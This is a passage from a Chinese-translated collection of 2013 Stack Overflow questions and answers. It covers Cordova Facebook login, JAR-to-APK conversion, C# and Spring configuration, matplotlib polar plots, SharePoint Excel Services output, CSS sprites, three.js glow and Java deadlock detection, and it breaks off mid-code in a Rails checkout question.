您需要传递一个附加`activityCode`参数[`Facebook.FORCE_DIALOG_AUTH`](https://developers.facebook.com/docs/reference/androidsdk/authentication/)：

```
me.facebook.authorize(cordova.getActivity(), me.permissions, Facebook.FORCE_DIALOG_AUTH, new AuthorizeListener(me)); 
```

* * *

我不完全确定 iOS，但您可以尝试使用[`openWithBehavior`](https://developers.facebook.com/docs/reference/ios/current/class/FBSession#openWithBehavior%3acompletionHandler%3a)和[`FBSessionLoginBehaviorForcingWebView`](https://developers.facebook.com/docs/reference/ios/current/class/FBSession#FBSessionLoginBehavior+enum)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-06-06T10:19:42.203

没有任何 Facebook 插件，您可以使用 Facebook 功能，为此使用**phonegap.facebook.inappbrowser.js**使用此 js 您可以轻松访问所有 Facebook 功能以获取更多信息，请访问此 URL：[没有任何插件的 Facebook 集成步骤](https://github.com/caiovaccaro/phonegap.facebook.inappbrowser)

# java - 如何将带有库的 JAR 编译为 apk

> ID：15936683
> 
> 赞同：0
> 
> 时间：2013-04-10T21:23:24.293
> 
> 标签：java, netbeans, jar, apk, jad

我从 NetBeans 获得带有库的 jar 文件，但无法将其转换为 apk。转换器询问 JAD 和 JAR 文件。

我在 lib 文件夹中有一个主 jar 和另外两个。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:39:08.073

您不能将 .jar 文件转换为 .apk！在 jar 文件中，我们有 .class 文件，但在 .apk 中，我们有 .dex 文件，其中 .dex 文件可以转换为 .class，然后是 .java。所以你可以看到 jar 文件比 .apk 文件落后一步

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:40:29.730

将项目（模块）设置从库更改为应用程序。

# c# - 通过 C# 中的对象列表修改变量的最佳方法

> ID：15936687
> 
> 赞同：0
> 
> 时间：2013-04-10T21:23:33.123
> 
> 标签：c#, list, variables, object

我正在尝试为与 C# 统一的项目构建升级系统，并且想知道通过一组自定义对象（大小可能会有所不同）来修改变量的最佳方法是什么，这些对象包含变量应该是多少的信息改变了。

一些想法浮现在脑海，但这是我的担忧：

1.  第一个是使用属性：

    ```
    public float SomeStat{
         get{
            float modStat = 0;

            foreach(StatChanger Stat in StatChangers){
               modStat += Stat.valueChange;
            }

            return modStat;
          }
    } 
    ```

    这将非常干净地解决我的问题，但我担心的是，当访问该属性时，例如每一帧，列表中的大量项目都会出现性能下降

2.  第二个是调用一个函数来更新变量并将其存储在另一个变量中，以便每一帧都使用而不会降低性能：

    ```
    public float someStat = 10;
    public float someStatModifed;

    void UpdateStat(){
         someStatModifed = someStat;

         foreach(StatChanger Stat in StatChangers){
            someStatModifed += Stat.valueChange;
         }
    } 
    ```

    这可行，但我可能会忘记调用它，并且当有多个需要更改的变量时，它会变得更加混乱。

我应该使用这两者的组合还是有更好的方法呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:34:18.160

我不能说性能会是什么，相对于其他任何东西，但你可以使用 LINQ：

```
someStatModifed += StatChangers.Sum(stat => stat.valueChange); 
```

另外，在出现问题之前不要太担心优化它。一定要*尝试*打破它，但不要修复它，除非它即使在大型数据集下也很明显。

# c# - windows窗体运行命令

> ID：15936691
> 
> 赞同：1
> 
> 时间：2013-04-10T21:24:05.407
> 
> 标签：c#, windows-forms-designer

我正在尝试启动一个新的 cmd 进程，从它运行一个批处理文件到设置环境，然后从它运行自定义命令。这可能吗？

到目前为止，我有：

```
Process cmd = new Process();
cmd.StartInfo.UseShellExecute = false;
cmd.StartInfo.Filename = <setup.cmd path>
cmd.StartInfo.CreateNoWindow = false;
cmd.StartInfo.RedirectStandardInput = true;
cmd.Start() 
```

这成功设置了环境，但 cmd 窗口立即关闭，我无法提交更多命令。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:27:10.180

只需添加 ProcessStartInfo.Arguments 并将“/K”作为值传递

```
Process cmd = new Process();
cmd.StartInfo.UseShellExecute = false;
cmd.StartInfo.FileName = "cmd.exe";
cmd.StartInfo.Arguments = "/K";
cmd.StartInfo.CreateNoWindow = false;
cmd.StartInfo.RedirectStandardInput = true;
cmd.Start(); 
```

传递参数`/K`将强制命令窗口保持打开
您还可以在后面添加批处理文件的名称`/K`

```
cmd.StartInfo.Arguments = "/K yourbatch.cmd args1 args2"; 
```

# python - python中的极坐标图

> ID：15936698
> 
> 赞同：2
> 
> 时间：2013-04-10T21:24:30.860
> 
> 标签：python, matplotlib

我正在尝试制作一个极地图`1/t`。到目前为止我所拥有的如下（这可能是错误的）。我怎样才能完成这个或使它工作？

```
from pylab import *
import matplotlib.pyplot as plt

theta = arange(0, 6 * pi, 0.01)

def f(theta):
    return 1 / theta 
```

![Mathematica 中的极坐标图](https://i.stack.imgur.com/jaLkw.png)

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-10T22:08:32.927

我认为问题在于您的第一个值`f(theta)`是`1/0 = inf`

```
theta = np.arange(0, 6*np.pi, .01)[1:] 

def f(x):
    return 1/x

plt.polar(theta, f(theta)) 
```

![one_over_theta](https://i.stack.imgur.com/AqBzi.png)

如果放大，它看起来会更好：

![飞涨](https://i.stack.imgur.com/td3Cg.png)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-10T22:16:08.440

```
from mpl_toolkits.axes_grid.axislines import SubplotZero
from matplotlib.ticker import MultipleLocator, FuncFormatter
import matplotlib.pyplot as plt
import numpy as np

plt.ion()

fig = plt.figure(1)
ax = SubplotZero(fig, 111)
fig.add_subplot(ax)

for dir in ax.axis:
    ax.axis[dir].set_visible(dir.endswith("zero"))

ax.set_xlim(-.35,.4)
ax.set_ylim(-.25,.45)
ax.set_aspect('equal')

tick_format = lambda x, i: '' if x == 0.0 else '%.1f' % x
for a in [ax.xaxis, ax.yaxis]:
    a.set_minor_locator(MultipleLocator(0.02))
    a.set_major_formatter(FuncFormatter(tick_format))

theta = np.arange(2*np.pi/3,6*np.pi,0.01)
r = 1 / theta

ax.plot(r*np.cos(theta), r*np.sin(theta), lw=2)

plt.show()
raw_input() 
```

![在此处输入图像描述](https://i.stack.imgur.com/PcNKI.png)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-10T22:11:09.377

如果你想要一个像 Mathematica 给你的正方形图，标准的 plot 函数只需要一个 x 值数组和一个 y 值数组。这里，`f(theta)`是半径，`cos`并且`sin`给出 x 和 y 方向，所以

```
plt.plot(f(theta)*cos(theta), f(theta)*sin(theta)) 
```

应该做的工作。这将显示所有数据，而不是像 Mathematica 中那样巧妙选择的子集，因此您可能想要限制它。例如：

```
plt.xlim((-0.35,0.43))
plt.ylim((-0.23,0.45)) 
```

给我你版本的范围。

# spring - 有没有办法在 Spring 中定义默认事务管理器

> ID：15936703
> 
> 赞同：14
> 
> 时间：2013-04-10T21:24:48.113
> 
> 标签：spring, hibernate, jpa, transactionmanager

我有一个将 Hibernate SessionFactory 用于一个数据库的现有应用程序。我们正在添加另一个数据库来进行分析。事务永远不会交叉，所以我不需要 JTA，但我确实想将 JPA EntityManager 用于新数据库。

我已经设置了 EntityManager 和新的事务管理器，我已经对其进行了验证，但 Spring 抱怨说我需要验证现有的 @Transactional 注释。我试图找到一种方法来告诉 Spring 使用 txManager 作为默认值。有没有办法做到这一点？否则，我必须将限定符添加到所有现有的 @Transactional 注释中，如果可能的话，我想避免这些注释。

```
 @Bean(name = "jpaTx")
  public PlatformTransactionManager transactionManagerJPA() throws NamingException {
    JpaTransactionManager txManager = new JpaTransactionManager(entityManagerFactory());

    return txManager;
  }

  @Bean
  public PlatformTransactionManager txManager() throws Exception {
    HibernateTransactionManager txManager = new HibernateTransactionManager(sessionFactory());
    txManager.setNestedTransactionAllowed(true);

    return txManager;
  } 
```

我得到的错误

```
No qualifying bean of type [org.springframework.transaction.PlatformTransactionManager] is defined: expected single matching bean but found 2: 
```

谢谢

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-04-11T12:54:57.650

我能够使用`@Primary`注释解决这个问题

```
 @Bean(name = "jpaTx")
  public PlatformTransactionManager transactionManagerJPA() throws NamingException {
    JpaTransactionManager txManager = new JpaTransactionManager(entityManagerFactory());

    return txManager;
  }

  @Bean
  @Primary
  public PlatformTransactionManager txManager() throws Exception {
    HibernateTransactionManager txManager = new HibernateTransactionManager(sessionFactory());
    txManager.setNestedTransactionAllowed(true);

    return txManager;
  } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T23:05:29.877

由于相同类型的 bean 由两种方法产生，因此您必须使用命名 bean 限定 @Transactional 注释。满足您的需求的一种简单方法是使用两个不同的 Spring 应用程序上下文。一种使用旧数据源，另一种使用新数据源。这些上下文中的每一个都将只有一个生成 PlatformTransactionManager 实例的方法。

# magento - Magento 覆盖扩展模板

> ID：15936706
> 
> 赞同：1
> 
> 时间：2013-04-10T21:24:59.017
> 
> 标签：magento

我需要覆盖我的一个扩展中的一个文件。我不想直接修改文件，我宁愿用本地文件覆盖它。

原始文件位于

```
app/design/frontend/aw_mobile/iphone/template/page/1column.phtml 
```

我的主题文件夹位于

```
app/design/frontend/PACKAGE-NAME/default 
```

我试着把新文件放在

```
app/design/frontend/PACKAGE-NAME/aw_mobile/iphone/template/page/1column.phtml 
```

但这没有用。有什么建议么？

谢谢我真的可以使用帮助！

# vb.net - MDI 中的键盘快捷键阻塞

> ID：15936707
> 
> 赞同：0
> 
> 时间：2013-04-10T21:25:00.317
> 
> 标签：vb.net

为什么我可以在 MDI 中捕获`Ctrl`+`X`等，键盘快捷键在测试框中，但在 MDI 的子窗体中不能捕获它们。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T22:38:23.617

如果您使用默认的编辑菜单，父表单会在 ctrl 快捷方式到达子表单之前“吃掉”它们。您可以删除编辑菜单上的快捷键（从菜单文本中删除＆），您应该可以

# mysql - 在 JOIN 查询中工作的 mysql

> ID：15936709
> 
> 赞同：-1
> 
> 时间：2013-04-10T21:25:15.127
> 
> 标签：mysql, join

假设我们有 2 张桌子

表格1：

```
 column
 ------
 A
 B 
```

和表2：

```
 column
 ------
 B
 C
 D 
```

现在假设我`JOIN`用这两个表运行一个命令。运行 JOIN 查询时，mysql 内部会发生什么？MySQL会创建这样的虚拟表吗？

```
 A|B
 A|C
 A|D
 B|B
 B|C
 B|D 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:42:19.887

当您在`JOIN`没有任何连接参数的两个表之间创建一个表时，MySQL 会查看语句中的第一个表。

它获取值，在您的情况下为“A”，然后将第二个表中的每个值与其配对。完成后，它返回到第一个表，从中获取下一个值（在您的情况下为“B”），然后再次将第二个表中的每个值都与其配对。

一种图形解释：

![在此处输入图像描述](https://i.stack.imgur.com/KXZb1.jpg)

# sharepoint - 配置 Sharepoint 2013 Excel Services REST API HTML 表示

> ID：15936716
> 
> 赞同：1
> 
> 时间：2013-04-10T21:25:33.473
> 
> 标签：sharepoint, sharepoint-2010, sharepoint-2013

我有一个 Microsoft Word 插件，它使用 Excel Services REST API 来获取表格，然后将其添加到当前文档中。

AddIn 与 Sharepoint 2010 完美配合，但当更新到 Sharepoint 2013 时，AddIn 不再工作，因为 Excel Services REST API 的输出非常不同。这是一个例子：

![示例表](https://i.stack.imgur.com/xJcoQ.png)

2010

```
 <div style="overflow: hidden">
            <table cellpadding="0" cellspacing="0" class="ewr-sheettable" style="border-collapse: collapse; margin-left: -2px; margin-top: -2px;">
                <tr>
                    <td style="border-bottom: 1px solid transparent; width: 1px; font-size: 1px; height: 1px; line-height: 1px;">
                        <div class="clp">&nbsp;</div>
                    </td>
                    <td style="font-size: 1px; height: 1px; line-height: 1px; width: 101px;">
                        <div class="clp" style="width: 101px;">&nbsp;</div>
                    </td>
                    <td style="font-size: 1px; height: 1px; line-height: 1px; width: 96px;">
                        <div class="clp" style="width: 96px;">&nbsp;</div>
                    </td>
                    <td style="font-size: 1px; height: 1px; line-height: 1px; width: 112px;">
                        <div class="clp" style="width: 112px;">&nbsp;</div>
                    </td>
                    <td style="font-size: 1px; height: 1px; line-height: 1px; width: 76px;">
                        <div class="clp" style="width: 76px;">&nbsp;</div>
                    </td>
                    <td style="font-size: 1px; height: 1px; line-height: 1px; width: 96px;">
                        <div class="clp" style="width: 96px;">&nbsp;</div>
                    </td>
                    <td style="font-size: 1px; height: 1px; line-height: 1px; width: 76px;">
                        <div class="clp" style="width: 76px;">&nbsp;</div>
                    </td>
                    <td style="font-size: 1px; height: 1px; line-height: 1px; width: 98px;">
                        <div class="clp" style="width: 98px;">&nbsp;</div>
                    </td>
                </tr>
                <tr>
                    <td style="border-bottom: 1px solid transparent; width: 1px;">
                        <div class="clp" style="height: 19px;">&nbsp;</div>
                    </td>
                    <td data-range="A3" style="text-align: left; vertical-align: bottom; font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-top: solid 1px #DADCDD; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;">
                        <div class="cv-nwl" style="width: 99px; max-height: 19px;">Test Column 1</div>
                    </td>
                    <td data-range="B3" style="text-align: left; vertical-align: bottom; font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-top: solid 1px #DADCDD; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;">
                        <div class="cv-nwl" style="width: 94px; max-height: 19px;">Test Column 2</div>
                    </td>
                    <td data-range="C3" style="text-align: left; vertical-align: bottom; font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-top: solid 1px #DADCDD; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;">
                        <div class="cv-nwl" style="width: 110px; max-height: 19px;">Test Column 3</div>
                    </td>
                    <td data-range="D3" style="font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-top: solid 1px #DADCDD; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;" />
                    <td data-range="E3" style="text-align: left; vertical-align: bottom; font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-top: solid 1px #DADCDD; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;">
                        <div class="cv-nwl" style="width: 94px; max-height: 19px;">Test Column 4</div>
                    </td>
                    <td data-range="F3" style="font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-top: solid 1px #DADCDD; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;" />
                    <td data-range="G3" style="text-align: left; vertical-align: bottom; font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-top: solid 1px #DADCDD; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;">
                        <div class="cv-nwl" style="width: 96px; max-height: 19px;">Test Column 5</div>
                    </td>
                </tr>
                <tr>
                    <td style="border-bottom: 1px solid transparent; width: 1px;">
                        <div class="clp" style="height: 19px;">&nbsp;</div>
                    </td>
                    <td data-range="A4" style="text-align: left; vertical-align: bottom; font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;">
                        <div class="cv-nwl" style="width: 99px; max-height: 19px;">Value1</div>
                    </td>
                    <td data-range="B4" style="text-align: left; vertical-align: bottom; font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;">
                        <div class="cv-nwl" style="width: 94px; max-height: 19px;">Value2</div>
                    </td>
                    <td data-range="C4" style="text-align: left; vertical-align: bottom; font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;">
                        <div class="cv-nwl" style="width: 110px; max-height: 19px;">Value3</div>
                    </td>
                    <td data-range="D4" style="text-align: left; vertical-align: bottom; font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;">
                        <div class="cv-nwl" style="width: 74px; max-height: 19px;">Value4</div>
                    </td>
                    <td data-range="E4" style="text-align: left; vertical-align: bottom; font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;">
                        <div class="cv-nwl" style="width: 94px; max-height: 19px;">Value5</div>
                    </td>
                    <td data-range="F4" style="font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;" />
                    <td data-range="G4" style="text-align: left; vertical-align: bottom; font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;">
                        <div class="cv-nwl" style="width: 96px; max-height: 19px;">Value6</div>
                    </td>
                </tr>
                <tr>
                    <td style="border-bottom: 1px solid transparent; width: 1px;">
                        <div class="clp" style="height: 19px;">&nbsp;</div>
                    </td>
                    <td data-range="A5" style="text-align: left; vertical-align: bottom; font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;">
                        <div class="cv-nwl" style="width: 99px; max-height: 19px;">Value7</div>
                    </td>
                    <td data-range="B5" style="text-align: left; vertical-align: bottom; font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;">
                        <div class="cv-nwl" style="width: 94px; max-height: 19px;">Value8</div>
                    </td>
                    <td data-range="C5" style="text-align: left; vertical-align: bottom; font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;">
                        <div class="cv-nwl" style="width: 110px; max-height: 19px;">Value9</div>
                    </td>
                    <td data-range="D5" style="font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;" />
                    <td data-range="E5" style="text-align: left; vertical-align: bottom; font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;">
                        <div class="cv-nwl" style="width: 94px; max-height: 19px;">Value10</div>
                    </td>
                    <td data-range="F5" style="font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;" />
                    <td data-range="G5" style="text-align: left; vertical-align: bottom; font: normal 11pt 'Calibri'; color: #000000; text-decoration: none; border-right: solid 1px #DADCDD; border-bottom: solid 1px #DADCDD;">
                        <div class="cv-nwl" style="width: 96px; max-height: 19px;">Value11</div>
                    </td>
                </tr>
            </table>
        </div> 
```

2013

```
 <div style="overflow: hidden">
            <div class="ewr-sheettable" style="position: relative; width: 662px; height: 60px; font: normal 11pt Calibri,'Segoe UI',Arial,Verdana,Sans-Serif; color: #000000; text-decoration: none;">
                <div id="grvl" style="position: absolute; height: 60px; width: 662px; top: 0; left: 0;">
                    <div style="position: absolute; height: 60px; border-right: 1px solid #dadcdd; width: 101px; left: 0px;"></div>
                    <div style="position: absolute; height: 60px; border-right: 1px solid #dadcdd; width: 96px; left: 102px;"></div>
                    <div style="position: absolute; height: 60px; border-right: 1px solid #dadcdd; width: 112px; left: 199px;"></div>
                    <div style="position: absolute; height: 60px; border-right: 1px solid #dadcdd; width: 76px; left: 312px;"></div>
                    <div style="position: absolute; height: 60px; border-right: 1px solid #dadcdd; width: 96px; left: 389px;"></div>
                    <div style="position: absolute; height: 60px; border-right: 1px solid #dadcdd; width: 76px; left: 486px;"></div>
                    <div style="position: absolute; height: 60px; border-right: 1px solid #dadcdd; width: 98px; left: 563px;"></div>
                </div>
                <div id="grhl" style="position: absolute; height: 60px; width: 662px; top: 0; left: 0;">
                    <div style="position: absolute; width: 662px; border-bottom: 1px solid #dadcdd; top: 0px; height: 19px;"></div>
                    <div style="position: absolute; width: 662px; border-bottom: 1px solid #dadcdd; top: 20px; height: 19px;"></div>
                    <div style="position: absolute; width: 662px; border-bottom: 1px solid #dadcdd; top: 40px; height: 19px;"></div>
                </div>
                <div id="Div1" style="position: absolute; height: 60px; width: 662px; top: 0; left: 0;">
                    <div class="ewr-nglr" style="position: absolute; width: 662px; top: 0px; height: 19px;">
                        <div style="left: 0px; width: 101px; position: absolute; height: 19px;">
                            <div class="cv-nwl" style="width: 99px; max-height: 19px; position: absolute; bottom: 0px; text-align: left;">Test Column 1</div>
                        </div>
                        <div style="left: 102px; width: 96px; position: absolute; height: 19px;">
                            <div class="cv-nwl" style="width: 94px; max-height: 19px; position: absolute; bottom: 0px; text-align: left;">Test Column 2</div>
                        </div>
                        <div style="left: 199px; width: 112px; position: absolute; height: 19px;">
                            <div class="cv-nwl" style="width: 110px; max-height: 19px; position: absolute; bottom: 0px; text-align: left;">Test Column 3</div>
                        </div>
                        <div style="left: 389px; width: 96px; position: absolute; height: 19px;">
                            <div class="cv-nwl" style="width: 94px; max-height: 19px; position: absolute; bottom: 0px; text-align: left;">Test Column 4</div>
                        </div>
                        <div style="left: 563px; width: 98px; position: absolute; height: 19px;">
                            <div class="cv-nwl" style="width: 96px; max-height: 19px; position: absolute; bottom: 0px; text-align: left;">Test Column 5</div>
                        </div>
                    </div>
                    <div class="ewr-nglr" style="position: absolute; width: 662px; top: 20px; height: 19px;">
                        <div style="left: 0px; width: 101px; position: absolute; height: 19px;">
                            <div class="cv-nwl" style="width: 99px; max-height: 19px; position: absolute; bottom: 0px; text-align: left;">Value1</div>
                        </div>
                        <div style="left: 102px; width: 96px; position: absolute; height: 19px;">
                            <div class="cv-nwl" style="width: 94px; max-height: 19px; position: absolute; bottom: 0px; text-align: left;">Value2</div>
                        </div>
                        <div style="left: 199px; width: 112px; position: absolute; height: 19px;">
                            <div class="cv-nwl" style="width: 110px; max-height: 19px; position: absolute; bottom: 0px; text-align: left;">Value3</div>
                        </div>
                        <div style="left: 312px; width: 76px; position: absolute; height: 19px;">
                            <div class="cv-nwl" style="width: 74px; max-height: 19px; position: absolute; bottom: 0px; text-align: left;">Value4</div>
                        </div>
                        <div style="left: 389px; width: 96px; position: absolute; height: 19px;">
                            <div class="cv-nwl" style="width: 94px; max-height: 19px; position: absolute; bottom: 0px; text-align: left;">Value5</div>
                        </div>
                        <div style="left: 563px; width: 98px; position: absolute; height: 19px;">
                            <div class="cv-nwl" style="width: 96px; max-height: 19px; position: absolute; bottom: 0px; text-align: left;">Value6</div>
                        </div>
                    </div>
                    <div class="ewr-nglr" style="position: absolute; width: 662px; top: 40px; height: 19px;">
                        <div style="left: 0px; width: 101px; position: absolute; height: 19px;">
                            <div class="cv-nwl" style="width: 99px; max-height: 19px; position: absolute; bottom: 0px; text-align: left;">Value7</div>
                        </div>
                        <div style="left: 102px; width: 96px; position: absolute; height: 19px;">
                            <div class="cv-nwl" style="width: 94px; max-height: 19px; position: absolute; bottom: 0px; text-align: left;">Value8</div>
                        </div>
                        <div style="left: 199px; width: 112px; position: absolute; height: 19px;">
                            <div class="cv-nwl" style="width: 110px; max-height: 19px; position: absolute; bottom: 0px; text-align: left;">Value9</div>
                        </div>
                        <div style="left: 389px; width: 96px; position: absolute; height: 19px;">
                            <div class="cv-nwl" style="width: 94px; max-height: 19px; position: absolute; bottom: 0px; text-align: left;">Value10</div>
                        </div>
                        <div style="left: 563px; width: 98px; position: absolute; height: 19px;">
                            <div class="cv-nwl" style="width: 96px; max-height: 19px; position: absolute; bottom: 0px; text-align: left;">Value11</div>
                        </div>
                    </div>
                </div>
            </div>
        </div> 
```

最糟糕的是表格的结构在 2013 的输出中丢失了，并且很难重建它，即使是 Word 2013。这是粘贴在 Word 2013 中的表格的屏幕截图： ![Word 2013 中的结果](https://i.stack.imgur.com/ReydU.png)

无论如何，Sharepoint 2013 中的某些模块是否通过代码配置或覆盖以获得与 2010 年相同的输出？

提前致谢！

# html - 如何在div的背景图像上获取锚标记？

> ID：15936719
> 
> 赞同：4
> 
> 时间：2013-04-10T21:25:48.013
> 
> 标签：html, css, anchor, sprite

HTML：

```
<div id="facey">
    <a href="http://www.facebook.com.au"></a>
</div> 
```

CSS：

```
#facey {
    float: left;
    width: 32px;
    height: 32px;
    background: url(file:///C|/Users/User/Documents/TAFE%20-%20Web/ICAWEB411A%20Design%20simple%20web%20page%20layouts/testing%20color/icons/facey%20sprite.png) no-repeat 0 0;
}

#facey:hover {
    background-position: 0 -32px;
} 
```

我有一个用于社交媒体图标的 CSS 精灵，我一直在尝试在它们上放置一个锚标记以访问相应的网站，但我不确定它是如何工作的，因为精灵图像用作背景图像和锚标记在 div 中似乎对我不起作用？我不确定我在这里做错了什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-10T21:27:37.370

将**CSS**样式添加`display:block;`到`#facey a`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-10T21:27:19.557

把背景放在anchor上而不是放在div上，最后是可以点击的anchor标签。div 在这里实际上是完全多余的。

```
<a href="http://www.facebook.com.au" id="facey"></a>

a#facey {
  float: left;
  width:32px;
  height: 32px;
  display: block;
  background:url(file:///C|/Users/User/Documents/TAFE%20-%20Web/ICAWEB411A%20Design%20simple%20web%20page%20layouts/testing%20color/icons/facey%20sprite.png) no-repeat 0 0;
}

a#facey:hover {
  background-position:0 -32px;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-10T23:56:50.730

您不能像那样从文件系统中引用文件，这在 IE 以外的任何浏览器中都被认为是一个安全漏洞。尝试使用相对路径：

```
#facey {
    float: left;
    width:32px;
    height: 32px;
    background:url(icons/facey%20sprite.png) no-repeat 0 0;
    } 
```

# 2d - 使用 three.js 围绕 2D 对象进行外发光

> ID：15936722
> 
> 赞同：3
> 
> 时间：2013-04-10T21:26:08.160
> 
> 标签：2d, three.js, webgl, shadow, glow

我有一个使用three.js 铺满/堆叠三角形二维“纸”的屏幕。对象以随机位置/间隔添加，并且在 z 轴上彼此*非常*靠近，因此它们不会堆叠得太高。

我有我想要的凹凸贴图和*形状*阴影的照明......但形状本身没有**投射**阴影。这是因为物体靠得太近而无法获得想要的效果，而且我不想弄乱当前的光源。投射阴影也只会在一个方向（与光源相反）......而我试图在整张纸周围获得阴影（实际上是外发光）。

因此，我正在尝试创建外发光或至少找到一个合理的解决方案来*伪造*整个形状周围的柔和阴影。我附上了一张图片，说明了我正在尝试完成的事情......本质上它就像一个 CSS 盒子阴影效果。

```
box-shadow:  0px 0px 18px rgba(50, 50, 50, 0.75); 
```

[![外发光](https://i.stack.imgur.com/e2K9q.png)](https://i.stack.imgur.com/e2K9q.png)

任何指导将不胜感激，谢谢！

**tl;dr：尝试在 three.js 中围绕 2D 形状创建外发光**

# java - 在多线程中找到死锁的原因？

> ID：15936725
> 
> 赞同：5
> 
> 时间：2013-04-10T21:26:16.343
> 
> 标签：java, multithreading, concurrency, deadlock

多线程应用程序冻结。可能是死锁造成的。如果是，那么我们如何找到死锁的原因？有什么工具和策略可以系统地做到这一点吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-10T21:34:15.860

1.  如果可能，请使用无锁数据结构，例如[ConcurrentLinkedQueue](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/ConcurrentLinkedQueue.html)。根据定义，无锁数据结构不会导致死锁。

2.  始终以相同的顺序获取锁。如果你的资源是A、B、C，那么所有线程都应该按照A -> B -> C，或者A -> C，或者B -> C等顺序获取它们。如果一个线程获取，就会发生死锁它们按照 A -> B -> C 的顺序获取，而另一个线程按照 C -> B -> A 的顺序获取它们。

3.  使用锁定超时 - 如果计时器到期，则线程释放其锁定。请务必在发生这种情况时进行记录，以便您可以重新检查您的锁定顺序。

4.  [使用死锁检测](http://meteatamel.wordpress.com/2012/03/21/deadlock-detection-in-java/)。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-04-10T21:34:25.453

> 我们如何找到死锁的原因？

*   **使用程序**

[`java.lang.management.ThreadMXBean`](http://docs.oracle.com/javase/6/docs/api/java/lang/management/ThreadMXBean.html)是找出Java死锁线程的答案。这是简短的代码演示：

```
import java.lang.management.*;
class  DeadLockDetect
{
    public void findDeadLocks()
    {
        ThreadMXBean tmx = ManagementFactory.getThreadMXBean();
        long[] ids = tmx.findDeadlockedThreads();
        if (ids != null )
        {
            ThreadInfo[] infos = tmx.getThreadInfo(ids,true,true);
            System.out.println("Following Threads are deadlocked");
            for (ThreadInfo info : infos)
            {
                System.out.println(info);
            }
        }
    }
} 
```

*   **使用工具**
    JConsole 是一种工具，它可以告诉您代码中运行的线程的几乎所有信息。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-04-10T21:34:08.867

我要做的第一件事是使用 jstack 获取线程堆栈，它是 JDK 附带的。

用法 ：`jstack <pid>`

在这里您可以看到所有正在运行的线程的当前状态。你可以看到线程等待锁等。

文档：[http ://docs.oracle.com/javase/1.5.0/docs/tooldocs/share/jstack.html](http://docs.oracle.com/javase/1.5.0/docs/tooldocs/share/jstack.html)

在这里您可以看到存在哪些不同的线程状态：http: [//docs.oracle.com/javase/1.5.0/docs/api/java/lang/Thread.State.html](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/Thread.State.html)

# ruby-on-rails - 使用 Wepay-rails gem 的 Rails 购物车结账，避免在结账返回时打开安全漏洞

> ID：15936727
> 
> 赞同：2
> 
> 时间：2013-04-10T21:26:22.583
> 
> 标签：ruby-on-rails, ruby, e-commerce

我一直在尝试使用我的 rails 应用程序设置 wepay-rails gem [https://github.com/adamthedeveloper/wepay-rails](https://github.com/adamthedeveloper/wepay-rails)，并且成功地这样做了，但是我意识到由于我的设置，它是可能的用户继续完成部分订单，然后打开一个新选项卡，创建一个新订单，然后返回第一个选项卡，这允许他们完成对第一个项目的结帐，但将第二个项目标记为已付款。

我已按照自述文件中的指南进行操作，以实现我当前的设置：

```
class Purchase::CheckoutController < ApplicationController
  include WepayRails::Payments
  def index
    begin
      @order = Order.find(session[:order_id])
